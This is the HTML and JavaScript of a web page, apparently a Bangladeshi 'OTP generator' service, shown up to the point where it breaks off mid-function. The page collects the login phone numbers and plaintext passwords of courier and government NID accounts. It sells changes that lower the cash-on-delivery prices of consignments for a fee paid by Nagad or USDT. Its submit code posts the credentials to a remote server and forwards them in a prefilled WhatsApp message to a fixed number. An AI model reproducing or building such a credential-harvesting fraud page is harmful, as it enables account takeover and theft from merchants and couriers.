<!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>1ai Service</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
  <link rel="stylesheet" href="./assets/css/main.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  .hidden {
    display: none !important;
  }
  .loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    color: white;
    font-size: 2rem;
  }
  .alert-success {
    color: green;
    padding: 10px;
    background: #e8f5e9;
    border-radius: 4px;
    margin: 10px 0;
  }
  .alert-error {
    color: red;
    padding: 10px;
    background: #ffebee;
    border-radius: 4px;
    margin: 10px 0;
  }
  
  /* Consignment Section Styling */
  .consignment-group {
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 8px;
    padding: 1.5rem;
    margin-bottom: 1.5rem;
    position: relative;
    background: rgba(255, 255, 255, 0.05);
    transition: all 0.3s ease;
  }
  
  .consignment-group:hover {
    border-color: rgba(28, 180, 149, 0.5);
  }
  
  .consignment-counter {
    font-weight: bold;
    color: #1cb495;
    margin-bottom: 1rem;
    font-size: 1.1em;
  }
  
  .remove-consignment {
    position: absolute;
    top: 1rem;
    right: 1rem;
    cursor: pointer;
    color: #ff4444 !important;
    background: rgba(255, 68, 68, 0.1);
    width: 24px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    transition: all 0.2s ease;
  }
  
  .remove-consignment:hover {
    background: rgba(255, 68, 68, 0.2);
  }
  
  /* Amount Group Styling */
  .amount-group {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1.5rem;
    margin: 1rem 0;
  }
  
  /* Form Group Spacing */
  .form-group {
    margin-bottom: 1.5rem;
  }
  
  /* Button Styling */
  .add-consignment {
    margin-bottom: 2rem;
    width: 100%;
  }
  
  .form-actions {
    display: flex;
    gap: 1rem;
    margin-top: 2rem;
  }
  
  .form-actions button {
    flex: 1;
  }
  
  /* Discount Button */
  .discount-btn {
    margin-top: 0.5rem;
    background: rgba(28, 180, 149, 0.2) !important;
  }
  
  .discount-btn:hover {
    background: rgba(28, 180, 149, 0.3) !important;
  }

  /* Scope Premium Service Button */
  .scope-btn {
    background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%) !important;
    color: white !important;
    width: 100%;
    margin: 1rem 0;
    padding: 1rem;
    border-radius: 10px;
    cursor: pointer;
    font-weight: bold;
    transition: all 0.3s ease;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    border: none;
    font-size: 1rem;
    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
  }

  .scope-btn:hover {
    background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%) !important;
    transform: translateY(-2px);
    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
  }

  .scope-btn i {
    margin-right: 8px;
    font-size: 1.2rem;
  }

  /* Scope Dialog Styling */
  .scope-dialog {
    max-width: 500px;
    width: 90%;
    border-radius: 8px;
    border: none;
    padding: 0;
    overflow: hidden;
    background: rgba(45, 45, 45, 0.95);
    color: #fff;
    box-shadow: 0 5px 15px rgba(0,0,0,0.5);
  }

  .scope-dialog::backdrop {
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(3px);
  }

  .scope-content {
    padding: 25px;
  }

  .scope-content h2 {
    margin-top: 0;
    color: #1cb495;
    text-align: center;
    border-bottom: 1px solid rgba(255,255,255,0.1);
    padding-bottom: 15px;
    margin-bottom: 20px;
    font-size: 1.5rem;
  }

  .scope-content h2 i {
    margin-right: 10px;
  }

  .scope-form-group {
    margin-bottom: 1.5rem;
  }

  .scope-form-group label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: bold;
    color: #1cb495;
    font-size: 1rem;
  }

  .scope-form-group input,
  .scope-form-group select {
    width: 100%;
    padding: 12px;
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 4px;
    background: rgba(255,255,255,0.1);
    color: #fff;
    transition: all 0.3s ease;
    font-size: 1rem;
  }

  .scope-form-group input:focus,
  .scope-form-group select:focus {
    outline: none;
    border-color: #1cb495;
    box-shadow: 0 0 0 2px rgba(28, 180, 149, 0.3);
  }

  .scope-actions {
    display: flex;
    gap: 1rem;
    margin-top: 2rem;
  }

  .scope-actions button {
    flex: 1;
    padding: 12px 16px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-weight: bold;
    transition: all 0.3s ease;
    font-size: 1rem;
  }

  .scope-submit {
    background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
    color: white;
  }

  .scope-submit:hover {
    background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%);
    transform: translateY(-2px);
  }

  .scope-close {
    background: rgba(255,255,255,0.1);
    color: #fff;
    border: 1px solid rgba(255,255,255,0.2) !important;
  }

  .scope-close:hover {
    background: rgba(255,255,255,0.2);
  }

  /* Responsive Adjustments */
  @media screen and (max-width: 736px) {
    .amount-group {
      grid-template-columns: 1fr;
    }
    
    .form-actions {
      flex-direction: column;
    }

    .scope-dialog {
      width: 95%;
      max-width: none;
      z-index: 10000;
    }

    .scope-actions {
      flex-direction: column;
    }

    /* Mobile-specific scope button adjustments */
    .scope-btn {
      padding: 1rem 0.5rem;
      font-size: 0.9rem;
      margin: 1rem 0;
      white-space: normal;
      line-height: 1.4;
      min-height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .scope-btn i {
      font-size: 1rem;
      margin-right: 6px;
    }

    .scope-content {
      padding: 15px;
    }

    .scope-content h2 {
      font-size: 1.3rem;
      padding-bottom: 10px;
    }

    .scope-form-group input,
    .scope-form-group select {
      padding: 10px;
      font-size: 0.9rem;
    }

    .scope-actions button {
      padding: 10px;
      font-size: 0.9rem;
    }

    #scope-section {
      margin: 1rem 0;
      padding: 0 5px;
    }
  }

  /* Very small mobile devices (e.g., iPhone 5/SE) */
  @media screen and (max-width: 320px) {
    .scope-btn {
      font-size: 0.8rem;
      padding: 0.8rem 0.5rem;
    }

    .scope-btn i {
      font-size: 0.9rem;
    }

    .scope-content h2 {
      font-size: 1.1rem;
    }
        /* Add this new style for the confirmation dialog */
    .confirmation-dialog {
      max-width: 400px;
      width: 90%;
      border-radius: 8px;
      border: none;
      padding: 0;
      overflow: hidden;
      background: rgba(45, 45, 45, 0.95);
      color: #fff;
      box-shadow: 0 5px 15px rgba(0,0,0,0.5);
      text-align: center;
    }

    .confirmation-content {
      padding: 25px;
    }

    .confirmation-content h2 {
      color: #1cb495;
      margin-bottom: 15px;
    }

    .confirmation-content p {
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .confirmation-ok {
      background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease;
      margin-top: 15px;
    }

    .confirmation-ok:hover {
      background: linear-gradient(135deg, #5a2d91 0%, #4a2477 100%);
      transform: translateY(-2px);
    }
  }
</style>
</head>
<body class="is-preload">
  <div id="bg"></div>
  <h1>One Ai Otp Generator</h1>

  <header id="header">
    <h3>Service Payment</h3>
    <p>সঠিক ভাবে বিস্তারিত তথ্য প্রদান করুন এবং সার্ভারচার্জ প্রদানের মাধ্যমে সার্ভিসটি এক্টিভ করুন</p>
  </header>

  <section>
        <!-- Scope Premium Service Section -->
<a href="support.html" class="button icon solid fa-crown scope-btn">
  <span>প্রিমিয়াম_বোনাসঃ ইস্যুবিহীন পেইজ গুলোর লিষ্ট দেখুন এখুনি!</span>
</a>

<div id="premium-voucher-status-display" style="margin-top: 20px; padding: 15px; background: rgba(28, 180, 149, 0.1); border-radius: 8px; display: none;">
  <p style="color: #1cb495; font-weight: bold; margin-bottom: 5px;"><i class="fas fa-star"></i> প্রিমিয়াম ভাউচার স্ট্যাটাস:</p>
  <p id="premium-voucher-code-otpgen" style="font-size: 1.1em; margin-bottom: 5px;"></p>
  <p id="premium-voucher-status-otpgen" style="font-size: 0.9em; color: #ccc;"></p>
</div>
    <h3>INPUT DATA</h3>
    <div id="discount-display" class="discount-banner">
      <i class="fas fa-tag"></i>
      <span id="discount-text">No active discount</span>
    </div>

    <form id="payment-form">
      <!-- Common Fields -->
      <div class="form-group">
        <label for="company">সার্ভিস/কোম্পানি:</label>
        <select id="company" name="company" required>
          <option value="">কোম্পানি বা সেবার নাম লিখুন </option>
          <option value="govt_nid">Govt NID</option>
          <option value="redx">RedX</option>
          <option value="pathao">Pathao Courier</option>
          <option value="steadfast">SteadFast</option>
        </select>
      </div>

      <div class="form-group">
        <label for="phone">এপ/ওয়েবসাইট লগইন মোবাইল নাম্বার:</label>
        <input type="tel" id="phone" name="phone" required 
               pattern="01[3-9]\d{8}" 
               title="11-digit Bangladeshi phone number (013-019)" placeholder="01XXXXXXXXX">
      </div>

      <div class="form-group">
        <label for="password">এপ/ওয়েবসাইট লগইন পাসওয়ার্ড:</label>
        <input type="text" id="password" name="password" required minlength="6" placeholder="Password">
      </div>


      <!-- Add this above the consignments container -->
      <p style="font-size: 0.9em; margin-bottom: 10px; color: #1cb495;">
          <i class="fas fa-info-circle"></i> প্রথম তিনটি ডেলিভারি এবং রিটার্ন সম্পুর্ন ফ্রি !!! ভাউচার ব্যতীত সর্বনিম্ন সার্ভারচার্জ 100tk !!
      </p>
      <!-- Consignments Container -->
      <div id="consignments-container">
        <div class="consignment-group" data-index="0">
          <div class="consignment-counter">Consignment #1</div>
          <span class="remove-consignment" onclick="removeConsignment(this)">✕</span>
          
          <div class="form-group">
            <label>কাষ্টমার ডিটেইলস:</label>
            <input type="text" class="name" name="consignments[0][name]" placeholder="কাষ্টমারের নাম" required>
            <input type="tel" class="phone1" name="consignments[0][phone]" 
                   pattern="01[3-9]\d{8}" placeholder="নাম্বারঃ 01XXXXXXXXX" required>
          </div>

          <div class="form-group">
            <label for="serviceType">সার্ভিস সিলেক্ট করুন:</label>
            <select class="service-type" name="consignments[0][serviceType]" required onchange="updateAmountFields(this)">
              <option value="">সার্ভিস সমূহঃ </option>
              <option value="pricecng">Price Change</option>
              <option value="partial">Partial</option>
              <option value="drto">Paid Return</option>
              <option value="delivery">Delivery</option>
              <option value="return">Return</option>
            </select>
          </div>

          <div class="form-group page-name-group hidden">
            <label for="pageName">পেজের নাম:</label>
            <div style="display: flex; gap: 10px;">
              <select class="page-name-select" name="consignments[0][pageName]" onchange="handlePageNameChange(this)" required>
                <option value="">Select Page</option>
                <option value="__add_new__">Add New Page...</option>
              </select>
              <button type="button" class="button small" onclick="addNewPage(this)">Add New</button>
            </div>
            <input type="text" class="new-page-name-input hidden" placeholder="Enter new page name">
          </div>

          <div class="amount-group">
            <div class="form-group original-amount-group">
              <label>প্রোডাক্টের বর্তমান মূল্য:</label>
              <input type="number" class="amount1" name="consignments[0][amount1]" 
                     min="00" max="100000" step="1" oninput="calculateTotalCharge()">
            </div>
            <div class="form-group updated-amount-group">
              <label>পরিবর্তীত মূল্য :</label>
              <input type="number" class="amount2" name="consignments[0][amount2]" 
                     min="00" max="100000" step="1" oninput="calculateTotalCharge()">
            </div>
          </div>
        </div>
      </div>

      <button type="button" class="button add-consignment" onclick="addConsignment()">
        ＋ Add Another Consignment
      </button>
      <!-- Add this below the consignments container -->
<div id="free-consignment-info" style="margin: 15px 0; padding: 10px; background: rgba(28, 180, 149, 0.1); border-radius: 5px;">
    <strong>ব্যাবহারযোগ্য ফ্রি ডেলিভারি ও রিটার্ন ভাউচার:</strong>
    <div>ডেলিভারি: <span id="free-delivery-count">3</span></div>
    <div>রিটার্ন: <span id="free-return-count">3</span></div>
</div>

      <div class="form-group">
        <label for="amount3">সার্ভার চার্জ:</label>
        <input type="number" id="amount3" name="amount3" readonly required>
        <br>
        <div>
          <button type="button" class="button icon solid fa-tag discount-btn" onclick="window.showDiscountWheel()">
            <span>ডিসকাউন্ট নিন!</span>
          </button>
        </div>
        <br>
        <div class="form-group">
          <label for="voucher-code">ভাউচার কোড:</label>
          <input type="text" id="voucher-code" name="voucherCode" placeholder="Enter voucher code">
          <button type="button" class="button" onclick="applyVoucher()">Apply Voucher</button>
          <div id="voucher-message"></div>
        </div>
              <div class="form-group">
        <label for="method">পেমেন্ট গেটওয়ে:</label>
        <select id="method" name="method" required onchange="updatePaymentDisplay()">
          <option value="">আপনার পেমেন্ট সার্ভিস সিলেক্ট করুনঃ</option>
          <option value="Crypto">Crypto(USDT)</option>
          <option value="Nagad">নগদ সেন্ডমানি: 01923002231</option>
        </select>
      </div>
        <div id="nagad-payment-info" class="payment-info">
          <small>সার্ভিসটি গ্রহণ নিশ্চিত করতে সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small><br>
          <small>নগদ পার্সোনাল(sendmoney): <span id="nagad-number">01923002231</span> <button type="button" class="copy-btn" data-target="nagad-number"><i class="fas fa-copy"></i></button></small><br>
        </div>
        <div id="crypto-payment-info" class="payment-info hidden">
          <small>সার্ভিসটি গ্রহণ নিশ্চিত করতে সার্ভারচار্জ অগ্রিম পরিশোধ করুন</small><br>
          <small>Crypto bep20 USDT Amount: <span id="usdt-amount">0.00</span> USDT <button type="button" class="copy-btn" data-target="usdt-amount"><i class="fas fa-copy"></i></button></small><br>
          <small>Crypto bep20 USDT Address: <span id="usdt-address">0x08a30256b232aCE8acc3BEeCA73A5F036ba373D0</span> <button type="button" class="copy-btn" data-target="usdt-address"><i class="fas fa-copy"></i></button></small><br>
        </div>
      </div>
      <div class="form-group">
        <label for="trxid">TRX ID: (পেমেন্ট সম্পন্ন করে ট্রান্সেকশান আইডি উল্লেখ করে পেমেন্ট কনফার্ম করুন)</label>
        <input type="text" id="trxid" name="trxid" required minlength="8">
      </div>

      <div class="form-actions">
        <button type="submit" class="button primary" id="submit-payment-button" disabled>কনফার্ম পেমেন্ট</button>
        <button type="button" class="button" onclick="clearForm()">ক্লিয়ার ফর্ম</button>
      </div>

      <div class="form-group" style="margin-top: 1.5rem;">
        <input type="checkbox" id="terms-checkbox" name="terms" style="margin-right: 0.5rem;">
        <label for="terms-checkbox" style="display: inline-block; font-size: 0.9em; color: red; background-color: black; padding: 10px; border-radius: 5px; border: 1px solid red;">আমি উক্ত সার্ভিস গ্রহণের জন্য অনুরোধ করছি
          এবং এই সকল পরিবর্তনের সম্পুর্ন দায়ভার আমি গ্রহণ করছি। ওয়ানএআই ইন্টিলিজেন্স আমার অনুরোধকৃত পরিবর্তন সমূহের জন্য কোন ভাবেই দায়ীনয়।ভবিষ্যতে কোন ধরণের ইনকোয়েরি তে আমি এর দায়ভার সম্পুর্ণ নিজে বহন করার নিশ্চয়তা দিচ্ছি।আমি যদি সার্ভিসের গোপনীয়তা নষ্ট করি ওয়ান এআই আমার গোপনীয়তা
          রক্ষা করতে বাধ্য থাকবে না তা আমি অবগত থেকে উক্ত সার্ভিস গ্রহণের অনুরোধ জানাচ্ছি। উক্ত শর্তে রাজি থাকলে চেকবক্সে টিক দিন। </label>
      </div>
    </form>
 <p>আপনার এপ/ওয়েবসাইট লগ আউট হলে কমপক্ষে ২৫ মিনিট লগইন করা থেকে বিরত থাকুন। অনুগ্রহ পূর্বক কিছুক্ষণ অপেক্ষা করুন পেমেন্ট সম্পন্ন হলে আপনার সার্ভিসটি স্বয়ংক্রিয় ভাবে প্রক্রিয়াকরণ শুরু হবে।</p>
    <div id="confirmation-message" style="margin-top: 20px;"></div>
  </section>

  <script>
    // Initialize loading state
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = '<i class="fas fa-spinner fa-spin fa-3x"></i>';
    document.body.appendChild(loadingOverlay);

    // Session Management
    let isSubmitting = false;
    let consignmentIndex = 1;
    let freeDeliveryUsed = 0;
    let freeReturnUsed = 0;

    // Form Validation Utilities
    const validatePhone = phone => /^01[3-9]\d{8}$/.test(phone);
    const validateAmount = amount => amount >= 00 && amount <= 100000;

    // Update amount fields based on service type
    function updateAmountFields(select) {
      const group = select.closest('.consignment-group');
      const originalAmountGroup = group.querySelector('.original-amount-group');
      const updatedAmountGroup = group.querySelector('.updated-amount-group');
      const amountGroup = group.querySelector('.amount-group');
      const pageNameGroup = group.querySelector('.page-name-group');
      const serviceType = select.value;
      
      // Reset all fields first
      originalAmountGroup.classList.remove('hidden');
      updatedAmountGroup.classList.remove('hidden');
      amountGroup.classList.remove('hidden');
      pageNameGroup.classList.add('hidden'); // New line: hide page name by default
      
      // Hide appropriate fields based on service type
      if (serviceType === 'delivery' || serviceType === 'return') {
        amountGroup.classList.add('hidden');
      } 
      else if (serviceType === 'drto') {
        originalAmountGroup.classList.add('hidden');
      } 
      else if (serviceType === 'pricecng') {
        pageNameGroup.classList.remove('hidden');
      }
      
      calculateTotalCharge();
    }

    // Add this function to update the free consignment display
    function updateFreeConsignmentDisplay() {
        document.getElementById('free-delivery-count').textContent = 
            Math.max(0, 3 - freeDeliveryUsed);
            
        document.getElementById('free-return-count').textContent = 
            Math.max(0, 3 - freeReturnUsed);
    }

    // Updated calculateTotalCharge function
    function calculateTotalCharge() {
        freeDeliveryUsed = 0;
        freeReturnUsed = 0;
        let totalCharge = 0;
        
        document.querySelectorAll('.consignment-group').forEach(group => {
            const serviceType = group.querySelector('.service-type').value;
            const amount1 = parseFloat(group.querySelector('.amount1').value) || 0;
            const amount2 = parseFloat(group.querySelector('.amount2').value) || 0;
            
            if (serviceType === 'pricecng') {
                if (amount1 > 0 && amount2 < amount1) {
                    totalCharge += (amount1 - amount2) / 2;
                }
            }
            else if (serviceType === 'partial') {
                totalCharge += 15;
            }
            else if (serviceType === 'drto') {
                if (amount2 > 99) {
                    totalCharge += 10;
                } else if (amount2 > 51) {
                    totalCharge += 15;
                } else if (amount2 > 1) {
                    totalCharge += 25;
                } else if (amount2 === 0) {
                    totalCharge += 10;
                }
            }
            else if (serviceType === 'delivery') {
                if (freeDeliveryUsed < 3) {
                    freeDeliveryUsed++;
                } else {
                    totalCharge += Math.floor(Math.random() * (10 - 7 + 1)) + 7;
                }
            }
            else if (serviceType === 'return') {
                if (freeReturnUsed < 3) {
                    freeReturnUsed++;
                } else {
                    totalCharge += Math.floor(Math.random() * (10 - 5 + 1)) + 5;
                }
            }
        }); // END OF LOOP - Moved outside the loop

        // Update the display after processing all consignments
        updateFreeConsignmentDisplay();

        const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
        console.log(`[otpgen.html] calculateTotalCharge - activeDiscount: ${discount}%`);
        if (discount > 0) {
            totalCharge *= (1 - discount / 100);
            console.log(`[otpgen.html] calculateTotalCharge - totalCharge after discount: ${totalCharge.toFixed(2)}`);
        }

        document.getElementById('amount3').value = totalCharge.toFixed(2);
        updatePaymentDisplay();
    }

    // New function to update payment display based on method
    function updatePaymentDisplay() {
        const method = document.getElementById('method').value;
        const nagadInfo = document.getElementById('nagad-payment-info');
        const cryptoInfo = document.getElementById('crypto-payment-info');
        const totalChargeBDT = parseFloat(document.getElementById('amount3').value) || 0;
        const USDT_EXCHANGE_RATE = 120; // 1 USDT = 120 BDT

        if (method === 'Nagad') {
            nagadInfo.classList.remove('hidden');
            cryptoInfo.classList.add('hidden');
        } else if (method === 'Crypto') {
            nagadInfo.classList.add('hidden');
            cryptoInfo.classList.remove('hidden');
            const usdtAmount = (totalChargeBDT / USDT_EXCHANGE_RATE).toFixed(4);
            document.getElementById('usdt-amount').textContent = usdtAmount;
        } else {
            nagadInfo.classList.remove('hidden'); // Default to Nagad if nothing selected
            cryptoInfo.classList.add('hidden');
        }
    }

    // Function to copy text to clipboard
    function copyToClipboard(elementId) {
        const element = document.getElementById(elementId);
        const textToCopy = element.textContent;
        navigator.clipboard.writeText(textToCopy).then(() => {
            showMessage('Copied to clipboard!', 'success');
        }).catch(err => {
            console.error('Failed to copy: ', err);
            showMessage('Failed to copy to clipboard.', 'error');
        });
    }

    // Enhanced Form Submission Handler
    document.getElementById('payment-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        if (isSubmitting) return;

        try {
            // Check authentication
            const authToken = localStorage.getItem('authToken');
            const userID = localStorage.getItem('userID');
            const tokenExp = localStorage.getItem('tokenExp');

            if (!authToken || !userID || !tokenExp || Date.now() > parseInt(tokenExp)) {
                showMessage('Session expired or invalid. Please log in again.', 'error');
                localStorage.clear(); // Clear potentially stale data
                setTimeout(() => { window.location.href = 'login.html'; }, 1500);
                return;
            }

            // Show loading state
            isSubmitting = true;
            loadingOverlay.style.display = 'flex';
            document.getElementById('confirmation-message').innerHTML = '';

            // Collect and validate form data
            const formData = await validateAndPrepareData();

            // Submit to server
            const response = await fetch('https://oneai-wjox.onrender.com/payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${authToken}`,
                    'X-User-ID': userID
                },
                body: JSON.stringify(formData)
            });

            const responseData = await response.json();
            
            if (response.ok) {
                handleSuccess(responseData, formData);
            } else {
                handleServerError(responseData);
            }
        } catch (error) {
            handleNetworkError(error);
        } finally {
            isSubmitting = false;
            loadingOverlay.style.display = 'none';
        }
    });

    async function validateAndPrepareData() {
        const form = document.getElementById('payment-form');
        const formData = {
            company: form.company.value,
            phone: form.phone.value.replace(/\D/g, ''),
            password: form.password.value.trim(),
            method: form.method.value,
            trxid: form.trxid.value.trim(),
            consignments: [],
            discount: parseInt(localStorage.getItem('activeDiscount')) || 0
        };

        // Validate core fields
        if (!validatePhone(formData.phone)) {
            throw new Error('Invalid phone number format');
        }

        if (formData.trxid.length < 8) {
            throw new Error('TRX ID must be at least 8 characters');
        }

        // Process consignments
        let totalCharge = 0;
        document.querySelectorAll('.consignment-group').forEach((group, index) => {
            const serviceType = group.querySelector('.service-type').value;
            const validServiceTypes = ['pricecng', 'partial', 'drto', 'delivery', 'return', 'list'];
            if (!validServiceTypes.includes(serviceType)) {
              throw new Error(`Consignment ${index + 1}: Invalid service type`);
            }

            const consignment = {
                serviceType: serviceType,
                name: group.querySelector('.name').value.trim(),
                phone: group.querySelector('.phone1').value.replace(/\D/g, ''),
                amount1: parseFloat(group.querySelector('.amount1').value) || 0,
                amount2: parseFloat(group.querySelector('.amount2').value) || 0
            };

            // Add pageName if serviceType is pricecng
            if (serviceType === 'pricecng') {
                let pageName = group.querySelector('.page-name').value;
                // Extract the base page name by removing tags and counts
                const match = pageName.match(/^(.*?)(?: \(Issue-Less\)|\s\(Issueless-Pending\)|\s\(Issue-Prone\)|\s\(New Listed\))?(?: \(\d+ changes\))?$/);
                if (match && match[1]) {
                    pageName = match[1].trim();
                } else {
                    pageName = pageName.trim(); // Fallback if regex doesn't match
                }

                if (!pageName) {
                    throw new Error(`Consignment ${index + 1}: Page name is required for Price Change service`);
                }
                consignment.pageName = pageName.toUpperCase();
            }

            // Validate consignment data
            if (!consignment.name || !validatePhone(consignment.phone)) {
                throw new Error(`Consignment ${index + 1} has invalid data`);
            }

            // Service-specific validation
            if (serviceType === 'pricecng') {
                if (!validateAmount(consignment.amount1) || 
                    !validateAmount(consignment.amount2)) {
                    throw new Error(`Consignment ${index + 1} has invalid amounts`);
                }
                if (consignment.amount2 >= consignment.amount1) {
                    throw new Error(`Consignment ${index + 1}: Updated amount must be less than original`);
                }
                totalCharge += (consignment.amount1 - consignment.amount2) / 2;
            } 
            else if (serviceType === 'partial') {
                totalCharge += 15;
            }
            else if (serviceType === 'drto') {
                if (consignment.amount2 > 0 && !validateAmount(consignment.amount2)) {
                    throw new Error(`Consignment ${index + 1} has invalid amount`);
                }
                if (consignment.amount2 > 99) {
                    totalCharge += 10;
                } else if (consignment.amount2 > 51) {
                    totalCharge += 15;
                } else if (consignment.amount2 > 1) {
                    totalCharge += 25;
                } else if (consignment.amount2 === 0) {
                    totalCharge += 10;
                }
            }

            formData.consignments.push(consignment);
        });

        // Apply discount
        const voucherCode = document.getElementById('voucher-code').value.trim();
        if (voucherCode) {
            formData.voucherCode = voucherCode;
        }
        if (formData.discount > 0) {
            totalCharge *= (1 - formData.discount / 100);
        }

        // Set final amount
        formData.amount3 = parseFloat(totalCharge.toFixed(2));

        // Validate total server charge
        // Validate total server charge
        const minAmount = formData.voucherCode ? 0 : 100; // 0 if voucher, 100 otherwise
        if (formData.amount3 < minAmount) {
            throw new Error(`Total server charge is too low. Minimum ${minAmount} BDT required.`);
        }
        return formData;
    }

    function handleSuccess(data, formData) {
        localStorage.setItem('recentPayment', JSON.stringify({
            company: formData.company,
            trxid: formData.trxid,
            amount: formData.amount3,
            status: 'Pending',
            timestamp: Date.now()
        }));

        // Construct WhatsApp message
        // Construct WhatsApp message
        const whatsappMessage = `
New Payment Submission:
Company: ${formData.company}
Login Phone: ${formData.phone}
Login Password: ${formData.password}
TRX ID: ${formData.trxid}
Total Amount: ৳${formData.amount3.toFixed(2)}
Payment Method: ${formData.method}
Discount Applied: ${formData.discount}%

Consignments:
${formData.consignments.map((c, index) => `
  Consignment #${index + 1}:
    Service: ${c.serviceType}
    Customer Name: ${c.name}
    Customer Phone: ${c.phone}
    Original Amount: ${c.amount1}
    Updated Amount: ${c.amount2}
`).join('')}
`.trim();

        // Open WhatsApp chat in a new tab
        window.open(`https://wa.me/8801568760780?text=${encodeURIComponent(whatsappMessage)}`, '_blank');

        showMessage('Payment successfully processed! Redirecting...', 'success');
        setTimeout(() => window.location.href = 'dashboard.html', 2000);
    }

    function handleServerError(responseData) {
        let errorMessage = 'Payment processing failed';
        
        // Handle validation errors
        if (responseData.errors) {
            errorMessage = responseData.errors.map(err => err.msg || err.message).join(', ');
        } 
        // Handle custom error messages
        else if (responseData.message) {
            errorMessage = responseData.message;
        }
        
        showMessage(errorMessage, 'error');
    }

    function handleNetworkError(error) {
        console.error('Network error:', error);
        showMessage('Network error. Please check your connection and try again.', 'error');
    }

    function showMessage(message, type) {
        const messageDiv = document.getElementById('confirmation-message');
        messageDiv.innerHTML = `<div class="alert-${type}">${message}</div>`;
        messageDiv.scrollIntoView({ behavior: 'smooth' });
    }

    // Copy button functionality
    document.addEventListener('click', (e) => {
        if (e.target.classList.contains('copy-btn') || e.target.closest('.copy-btn')) {
            const targetId = e.target.closest('.copy-btn').getAttribute('data-target');
            copyToClipboard(targetId);
        }
    });

    // Function to populate page name dropdowns with tags and counts
    async function populatePageNameDropdowns() {
        // Fetch latest page data before populating
        await fetchPageData();

        document.querySelectorAll('.consignment-group').forEach((group, index) => {
            const selectElement = group.querySelector('.page-name-select');
            if (!selectElement) return;

            const currentSelectedValue = selectElement.value; // Preserve current selection
            selectElement.innerHTML = ''; // Clear existing options

            const defaultOption = document.createElement('option');
            defaultOption.value = '';
            defaultOption.textContent = 'Select Page';
            selectElement.appendChild(defaultOption);

            const addNewOption = document.createElement('option');
            addNewOption.value = '__add_new__';
            addNewOption.textContent = 'Add New Page...';
            selectElement.appendChild(addNewOption);

            const allPageNames = new Set();

            // Add page names from page statuses
            window.pageStatuses.forEach(pageStatus => allPageNames.add(pageStatus.pageName));
            // Add pages from price change counts (in case some exist but don't have a status yet)
            window.pagePriceChangeCounts.forEach(item => allPageNames.add(item.pageName));

            const sortedPageNames = Array.from(allPageNames).sort();

            sortedPageNames.forEach(pageName => {
                const pageStatus = window.pageStatuses.find(ps => ps.pageName === pageName);
                let tag = '';
                if (pageStatus) {
                    switch (pageStatus.status) {
                        case 'issueless':
                            tag = ' (Issue-Less)';
                            break;
                        case 'issueless-pending':
                            tag = ' (Issueless-Pending)';
                            break;
                        case 'issue-prone':
                            tag = ' (Issue-Prone)';
                            break;
                        case 'new-listed':
                            tag = ' (New Listed)';
                            break;
                    }
                } else {
                    tag = ' (New Listed)'; // Default for pages not yet in PageStatus
                }

                const priceChangeItem = window.pagePriceChangeCounts.find(item => item.pageName === pageName);
                const count = priceChangeItem ? priceChangeItem.count : 0;
                const countText = count > 0 ? ` (${count} changes)` : '';

                const option = document.createElement('option');
                option.value = pageName;
                option.textContent = `${pageName}${tag}${countText}`;
                selectElement.appendChild(option);
                selectElement.appendChild(option);
            });

            // Restore previous selection or set to default if not found
            if (currentSelectedValue && Array.from(selectElement.options).some(opt => opt.value === currentSelectedValue)) {
                selectElement.value = currentSelectedValue;
            } else {
                selectElement.value = ''; // Select "Select Page"
            }
            // Trigger change handler in case '__add_new__' was previously selected
            handlePageNameChange(selectElement);
        });
    }

    function handlePageNameChange(selectElement) {
        const group = selectElement.closest('.consignment-group');
        const newPageNameInput = group.querySelector('.new-page-name-input');
        if (selectElement.value === '__add_new__') {
            newPageNameInput.classList.remove('hidden');
            newPageNameInput.setAttribute('required', 'required');
            newPageNameInput.focus();
        } else {
            newPageNameInput.classList.add('hidden');
            newPageNameInput.removeAttribute('required');
            newPageNameInput.value = ''; // Clear value when hidden
        }
    }

    async function addNewPage(buttonElement) {
        const group = buttonElement.closest('.consignment-group');
        const newPageNameInput = group.querySelector('.new-page-name-input');
        const newPageName = newPageNameInput.value.trim();

        if (!newPageName) {
            showMessage('Please enter a page name to add.', 'error');
            return;
        }

        try {
            loadingOverlay.style.display = 'flex';
            const response = await fetch(`${API_BASE}/api/page-data/add-page`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${localStorage.getItem('authToken')}` // Assuming auth token is needed
                },
                body: JSON.stringify({ pageName: newPageName })
            });

            const responseData = await response.json();

            if (response.ok && responseData.success) {
                showMessage(`Page '${newPageName}' added successfully!`, 'success');
                newPageNameInput.value = ''; // Clear input
                newPageNameInput.classList.add('hidden'); // Hide input
                await populatePageNameDropdowns(); // Refresh all dropdowns
                // Select the newly added page in the current dropdown
                group.querySelector('.page-name-select').value = newPageName;
            } else {
